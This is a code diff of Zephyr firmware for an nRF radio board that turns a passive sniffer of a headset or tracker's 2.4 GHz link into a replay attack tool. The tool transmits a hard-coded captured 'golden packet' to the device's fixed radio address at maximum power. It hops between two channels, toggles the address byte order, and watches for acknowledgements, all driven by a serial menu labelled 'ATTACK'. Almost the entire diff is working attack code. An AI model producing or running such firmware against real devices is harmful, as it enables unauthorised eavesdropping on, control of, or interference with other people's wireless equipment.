@@ -3,120 +3,184 @@
 #include <hal/nrf_radio.h>
 #include <zephyr/usb/usb_device.h>
 #include <zephyr/drivers/gpio.h>
+#include <zephyr/drivers/uart.h>
 #include <string.h>
-#include <stdint.h> // 避免編譯錯誤
+#include <stdint.h>
 
-// ============================================================
-// 🕵️‍♂️ 監聽設定 (基於 PyOCD 驗證的絕對參數)
-// ============================================================
+// ================= 參數設定 =================
+static const uint8_t TARGET_FREQS[] = {4, 78}; // 2404 & 2478 MHz
+#define TARGET_ADDR_BASE   0xd235cf35
+#define TARGET_ADDR_PREFIX 0x00
 
-// 1. 鎖定頻率: 2404 MHz 
-// 追蹤器最常待在 Channel 4
-#define TARGET_FREQ  4 
+// ================= 數據庫 (你的黃金封包) =================
+// Data: 16 00 00 21 20 80 0F AF F0 00 00 C0 0D FF F0 0F CF 00 29 79 10 27 68 D8 2A 88 31 98 23 00 00 00
+static uint8_t GOLDEN_PACKET[] = {
+    0x16, 0x00, 0x00, 0x21, 0x20, 0x80, 0x0F, 0xAF, 
+    0xF0, 0x00, 0x00, 0xC0, 0x0D, 0xFF, 0xF0, 0x0F, 
+    0xCF, 0x00, 0x29, 0x79, 0x10, 0x27, 0x68, 0xD8, 
+    0x2A, 0x88, 0x31, 0x98, 0x23, 0x00, 0x00, 0x00
+};
 
-// 2. 鎖定地址: Pipe 1 的真實組合
-// BASE1=d235cf35, PREFIX0 Byte1=00
-// 這是通往追蹤器的唯一門牌號碼
-#define SPY_ADDR_BASE   0xd235cf35
-#define SPY_ADDR_PREFIX 0x00
-
-// ============================================================
+// ===========================================
 
 #define LED0_NODE DT_ALIAS(led0)
 static const struct gpio_dt_spec led = GPIO_DT_SPEC_GET(LED0_NODE, gpios);
+const struct device *uart_dev = DEVICE_DT_GET(DT_CHOSEN(zephyr_console));
 
-static uint8_t rx_buffer[64];
+static uint8_t packet_buffer[64];
+static bool attack_active = false;
+static bool swap_address = false;
 
-void radio_init_spy(void) {
-    // 重置 Radio
+// 反轉地址函數
+uint32_t reverse_32(uint32_t n) {
+    return ((n>>24)&0xff) | ((n<<8)&0xff0000) | ((n>>8)&0xff00) | ((n<<24)&0xff000000);
+}
+
+void radio_init_mirror(void) {
     NRF_RADIO->POWER = 0;
     k_busy_wait(500);
     NRF_RADIO->POWER = 1;
+    
+    // 最大功率
+    NRF_RADIO->TXPOWER = (RADIO_TXPOWER_TXPOWER_Pos8dBm << RADIO_TXPOWER_TXPOWER_Pos);
 
-    // === 1. CRC 設定 (必須開啟，這是最好的濾網) ===
+    // CRC 設定 (必須開啟)
     NRF_RADIO->CRCCNF = (RADIO_CRCCNF_LEN_Two << RADIO_CRCCNF_LEN_Pos);
     NRF_RADIO->CRCPOLY = 0x11021; 
     NRF_RADIO->CRCINIT = 0xFFFF;
-
-    // === 2. 速率與格式 ===
     NRF_RADIO->MODE = NRF_RADIO_MODE_BLE_2MBIT; 
     
-    // PCNF0: S0=0, S1=0, L=8 (標準 BLE 監聽設定)
-    // 我們先用標準設定，這樣可以把 Header 和 Payload 分得最清楚
-    NRF_RADIO->PCNF0 = (8UL << RADIO_PCNF0_LFLEN_Pos);
+    // ★★★ 設定為固定長度模式 (Fixed Length) ★★★
+    // LFLEN = 0 (不使用長度欄位)
+    NRF_RADIO->PCNF0 = (0UL << RADIO_PCNF0_LFLEN_Pos);
     
-    // PCNF1: MaxLen=60, Big Endian
-    NRF_RADIO->PCNF1 = (60UL << RADIO_PCNF1_MAXLEN_Pos) | 
-                       (4UL  << RADIO_PCNF1_BALEN_Pos) | 
+    // STATLEN = 32 (強制發送/接收 32 Bytes)
+    NRF_RADIO->PCNF1 = (32UL << RADIO_PCNF1_STATLEN_Pos) | 
+                       (32UL << RADIO_PCNF1_MAXLEN_Pos)  | 
+                       (4UL  << RADIO_PCNF1_BALEN_Pos)   | 
                        (1UL  << RADIO_PCNF1_ENDIAN_Pos);
-
-    // === 3. 頻率與地址 ===
-    NRF_RADIO->FREQUENCY = TARGET_FREQ;
-
-    // 設定竊聽地址
-    NRF_RADIO->BASE0 = SPY_ADDR_BASE;      // 0xD235CF35
-    NRF_RADIO->PREFIX0 = SPY_ADDR_PREFIX;  // 0x00
     
-    // 啟用接收通道 0
+    NRF_RADIO->BASE0 = TARGET_ADDR_BASE;
+    NRF_RADIO->PREFIX0 = TARGET_ADDR_PREFIX; 
+    NRF_RADIO->TXADDRESS = 0; 
     NRF_RADIO->RXADDRESSES = 1; 
 }
 
-void spy_loop(void) {
-    // 設定接收緩衝區
-    NRF_RADIO->PACKETPTR = (uint32_t)rx_buffer;
-    
-    // 設定捷徑：收到封包後(END)自動重啟接收(START)
-    // 這樣就算頭盔連發，我們也不會漏接
-    NRF_RADIO->SHORTS = RADIO_SHORTS_READY_START_Msk | RADIO_SHORTS_END_START_Msk;
-    
-    // 啟動接收任務
-    NRF_RADIO->TASKS_RXEN = 1;
+void send_on_freq(uint8_t freq) {
+    // 1. 停用 Radio
+    NRF_RADIO->SHORTS = 0;
+    NRF_RADIO->TASKS_DISABLE = 1;
+    while (NRF_RADIO->EVENTS_DISABLED == 0);
+    NRF_RADIO->EVENTS_DISABLED = 0;
 
-    printk("\n>>> [SPY MODE ACTIVATED] Listening on 2404 MHz <<<\n");
-    printk(">>> Target Address: 00 D2 35 CF 35 <<<\n");
-    printk(">>> Waiting for Headset Signal...\n");
+    NRF_RADIO->FREQUENCY = freq;
+    
+    // 地址設定 (正常 vs 反轉)
+    if (swap_address) NRF_RADIO->BASE0 = reverse_32(TARGET_ADDR_BASE);
+    else NRF_RADIO->BASE0 = TARGET_ADDR_BASE;
 
-    while (1) {
-        // 檢查是否有收到封包的事件
+    // 2. 準備數據 (自動切換 16/1C)
+    static int toggle_cnt = 0;
+    GOLDEN_PACKET[0] = (toggle_cnt++ % 2 == 0) ? 0x16 : 0x1C;
+    
+    memcpy(packet_buffer, GOLDEN_PACKET, 32); 
+    NRF_RADIO->PACKETPTR = (uint32_t)packet_buffer;
+
+    // 3. 啟動 Turbo Shortcuts (自動 TX -> RX)
+    NRF_RADIO->SHORTS = RADIO_SHORTS_READY_START_Msk | 
+                        RADIO_SHORTS_END_DISABLE_Msk | 
+                        RADIO_SHORTS_DISABLED_RXEN_Msk |
+                        RADIO_SHORTS_RXREADY_START_Msk;
+
+    NRF_RADIO->TASKS_TXEN = 1;
+
+    // 4. 等待流程 (TX + T_IFS + ACK)
+    k_busy_wait(200); 
+
+    // 5. 檢查 ACK
+    int timeout_counter = 2000;
+    bool ack_received = false;
+    
+    while(timeout_counter--) {
         if (NRF_RADIO->EVENTS_END) {
-            NRF_RADIO->EVENTS_END = 0; // 清除事件
-
-            // 關鍵：只有 CRC 正確才代表是真正的頭盔訊號
             if (NRF_RADIO->CRCSTATUS == 1) {
-                int8_t rssi = -(int8_t)NRF_RADIO->RSSISAMPLE;
-                
-                // 閃燈提示
-                gpio_pin_toggle_dt(&led);
-
-                // 印出捕捉到的數據
-                // 為了方便閱讀，我們加上分隔線
-                printk("\n🔥 [CAPTURED!] RSSI: %d | Data: ", rssi);
-                
-                // 印出前 32 bytes (足夠涵蓋所有指令)
-                for(int i=0; i<32; i++) {
-                    printk("%02X ", rx_buffer[i]);
-                }
-                printk("\n");
+                ack_received = true;
             }
+            NRF_RADIO->EVENTS_END = 0;
+            break; 
         }
-        
-        // 輕微延遲，避免 Watchdog 觸發，但不能太久以免漏接
-        k_busy_wait(100);
+        k_busy_wait(1);
+    }
+
+    // 清理
+    NRF_RADIO->SHORTS = 0;
+    NRF_RADIO->TASKS_DISABLE = 1;
+
+    // 回報結果
+    if (ack_received) {
+        int8_t rssi = -(int8_t)NRF_RADIO->RSSISAMPLE;
+        printk(">>> [HIT!] ACK RECEIVED on %d MHz | RSSI: %d\n", 2400+freq, rssi);
+        gpio_pin_set_dt(&led, 1);
+        k_busy_wait(20000);
+        gpio_pin_set_dt(&led, 0);
+    }
+}
+
+void print_menu() {
+    printk("\n\n=== RF TOOL v6.0 (Golden Packet Mirror) ===\n");
+    printk(" [1] ATTACK: Send Captured Packet (32 Bytes)\n");
+    printk(" [6] Toggle Address Swap (Current: %s)\n", swap_address ? "SWAPPED" : "NORMAL");
+    printk(" [0] STOP\n");
+    printk("----------------------------------------\n");
+    printk(" Current: %s\n", attack_active ? "FIRING" : "IDLE");
+}
+
+void uart_cb(const struct device *dev, void *user_data) {
+    uint8_t c;
+    if (!uart_irq_update(dev)) return;
+    if (!uart_irq_rx_ready(dev)) return;
+
+    while (uart_fifo_read(dev, &c, 1) == 1) {
+        switch (c) {
+            case '1':
+                attack_active = true;
+                printk("\n>>> FIRING GOLDEN PACKET...\n");
+                break;
+            case '6':
+                swap_address = !swap_address;
+                printk("\n>>> ADDRESS SWAP: %s <<<\n", swap_address ? "ON" : "OFF");
+                break;
+            case '0':
+                attack_active = false;
+                printk("\n>>> STOPPED <<<\n");
+                break;
+            default:
+                print_menu();
+                break;
+        }
     }
 }
 
 int main(void) {
     usb_enable(NULL);
+    if (device_is_ready(led.port)) gpio_pin_configure_dt(&led, GPIO_OUTPUT_ACTIVE);
     
-    if (device_is_ready(led.port)) {
-        gpio_pin_configure_dt(&led, GPIO_OUTPUT_ACTIVE);
-    }
+    uart_irq_callback_user_data_set(uart_dev, uart_cb, NULL);
+    uart_irq_rx_enable(uart_dev);
 
-    // 等待 USB 連線穩定
+    radio_init_mirror(); 
     k_sleep(K_SECONDS(2));
+    print_menu();
 
-    printk("\n=== RF SPY v4.0 (Golden Packet Hunter) ===\n");
-    
-    radio_init_spy();
-    spy_loop();
+    int freq_idx = 0;
+
+    while (1) {
+        if (attack_active) {
+            send_on_freq(TARGET_FREQS[freq_idx]);
+            freq_idx = (freq_idx + 1) % 2; 
+        } else {
+            gpio_pin_toggle_dt(&led);
+            k_sleep(K_MSEC(500));
+        }
+    }
 }
